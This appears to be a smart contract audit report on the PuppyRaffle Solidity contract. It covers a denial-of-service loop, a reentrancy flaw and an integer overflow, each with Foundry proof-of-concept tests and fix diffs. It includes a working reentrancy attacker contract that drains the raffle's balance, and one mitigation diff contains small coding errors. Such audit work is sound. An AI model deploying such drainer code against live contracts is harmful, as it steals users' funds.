### [M-#] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service(DOS) attack, incrementing gas costs for future entrants.

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array, is an additional check the loop will have to make.

```js
// @audit Dos Attack
@>  for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```

**Impact:** The gas cost for raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering, and causing a rush at the start of a raffle to be one of the first entrants in the queue.

An attacker might make the `PuppyRaffle::entrants` array so big, that no else enters, guaranteeing themselves the win.

**Proof of Concept:**

If we have 2 set of 100 players enter, the gas costs will be as such:
- 1st 100 players: ~6252039 gas 
- 2nd 100 players: ~18068130 gas

This is more than 3x more expensive for the seconds 100 players.

<details>
<summary>Poc</summary>
Place the following test into `PuppyRaffleTest.t.sol`

```js
    function test_denialOfService() public {
        vm.txGasPrice(1);

        // let's enter 100 players
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint160 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }

        uint256 gasStartFirst = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        uint256 gasEndFirst = gasleft();
        uint256 gasUsedFirst = (gasStartFirst - gasEndFirst) * tx.gasprice;

        console.log("Gas Cost for the first %s players ->", playersNum, gasUsedFirst);

        // now for the 2nd 100 players
        address[] memory playersTwo = new address[](playersNum);
        for (uint160 i = 0; i < playersNum; i++) {
            playersTwo[i] = address(i + playersNum);
        }

        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(playersTwo);
        uint256 gasEndSecond = gasleft();
        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;

        console.log("Gas Cost for the second %s players ->", playersNum, gasUsedSecond);

        assertLt(gasUsedFirst, gasUsedSecond);

        // Logs:
        //     Gas Cost for the first 100 players -> 6252039
        //     Gas Cost for the second 100 players -> 18068130
    }
```

</details>

**Recommended Mitigation:** There are a few recommendations.

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check dosen't prevent the same person from entering multiple times, only the same wallet address.

2. Consider using a mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered.

<details>
<summary>Mitigation</summary>

```diff
+   mapping(address => uint256) public s_addressToRaffleId;
+   uint256 public raffleId = 0;
.
.
.
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
+           // Check for duplicates only from the new players
+           require(s_addressToRaffleId[i] != raffleId, "PuppyRaffle: Duplicate player");
            players.push(newPlayers[i]);
            addressToRaffleId[newPlayers[i]] = raffleId;
        }

-       // check for duplicates
-       for (uint256 i = 0; i < players.length - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-           }
-       }
    }

    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    }
```
</details>

---

### [H-#] `PuppyRaffle::refund` is vulnerable to Re-entrancy attack, potentially resulting in the loss of funds.

**Description:** `PuppyRaffle::refund` is sending the `entranceFee` back to the user. However, the issue arises because the user's balance is updated after sending the ETH, leading to Re-entrancy vulnerability.

```js
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }   
```

**Impact:** This results in the attacker withdrawing all the funds locked within the contract.

**Proof of Concept:** 

<details>
<summary>Poc</summary>

```js
    function test_Reentrancy() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        uint256 raffleBalanceBefore = address(puppyRaffle).balance;

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);

        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackContractBalance = address(attackerContract).balance;

        vm.startPrank(attackUser);
        attackerContract.attack{value: entranceFee}();
        vm.stopPrank();
        // attacker has entered the raffle.

        uint256 endingAttackContractBalance = address(attackerContract).balance;
        uint256 raffleBalanceAfterAttack = address(puppyRaffle).balance;

        console.log("Starting attacker contract balance: ", startingAttackContractBalance);
        console.log("Starting Raffle Balance", raffleBalanceBefore);

        console.log("Ending attacker contract balance: ", endingAttackContractBalance);
        console.log("Raffle Balance After Attack", raffleBalanceAfterAttack);

        assertEq(endingAttackContractBalance, startingAttackContractBalance + 5 ether, "attackerContractBalance");
        assertEq(raffleBalanceAfterAttack, 0);
    }

    contract ReentrancyAttacker {
        PuppyRaffle private immutable i_victimContract;
        uint256 private immutable i_entranceFee;
        uint256 private s_attackerIndex;

        constructor(PuppyRaffle victimContract) {
            i_victimContract = PuppyRaffle(victimContract);
            i_entranceFee = victimContract.entranceFee();
        }

        function attack() external payable {
            address[] memory players = new address[](1);
            players[0] = address(this);
            i_victimContract.enterRaffle{value: i_entranceFee}(players);

            s_attackerIndex = i_victimContract.getActivePlayerIndex(address(this));
            i_victimContract.refund(s_attackerIndex);
        }

        function _stealMoney() internal {
            if (address(i_victimContract).balance > 0) {
                i_victimContract.refund(s_attackerIndex);
            }
        }

        receive() external payable {
            _stealMoney();
        }

        fallback() external payable {
            _stealMoney();
        }
    }
```

</details>

**Recommended Mitigation:** 

There are few mitigations:

1. Follow CEI(Checks, Effects, Interactions).
   - Modifying storage variables falls under Effects.
   - Sending ETH to other contracts falls under Interactions.
   - To preserve CEI, storage variables has to be updated before external interactions.

2. Use Reentrancy Guard from [Openzeppelin](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard). 

<details>
<summary>Mitigation</summary>

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

-       payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);

+       payable(msg.sender).sendValue(entranceFee);
    }
```

</details>

---

### [H-#] The `PuppyRaffle::selectWinner` function sets aside 20% of `totalAmountCollected` for later withdrawal by the owner. However, as `totalFees` is stored as a uint64, there is a risk of potential integer overflow.

**Description:** `type(uint64).max` value is `18446744073709551615`, Let's say 100 players entered the raffle therfore total fees will be 100 ether. 20% of 100 ether will be  `20000000000000000000`. This number is bigger than `type(uint64).max` which can cause potential overflow.

```js
    function selectWinner() external {
        .
        .
        .
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;

@>      totalFees = totalFees + uint64(fee);

    }

```

**Impact:** As more players enter, `totalFees` will get bigger and 20% of `totalFees` cannot be stored in `fee` which is `uint64` which can cause potential Integer Overflow.

**Proof of Concept:**

<details>
<summary>Poc</summary>

```js
    function test_Overflow() public {
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint160 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }

        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);

        // simulate raffle duration is over
        vm.warp(4 days);
        vm.roll(block.number + 1);

        // // let's call select winner
        puppyRaffle.selectWinner();

        uint256 actualFee = ((players.length * entranceFee) * 20) / 100;
        console.log("Actual Fee", actualFee); // 20000000000000000000

        uint256 precisionLostFee = puppyRaffle.totalFees();
        console.log("Precison Lost Fee", precisionLostFee); // 1553255926290448384
    }

    - 20% of 100 ether is 20 ether
    - since typecasting to `uint64`, `totalFees` is displaying some random number. 
```


</details>

**Recommended Mitigation:**

Consider avoiding type casting from bigger to smaller.
eg: `uint256` to `uint64`

<details>
<summary>Mitigation</summary>

```diff
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;

    function selectWinner() external {
        .
        .
        .
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        
-        totalFees = totalFees + uint64(fee);
+        totalFees = totalFees + fee;
    }
```
</details>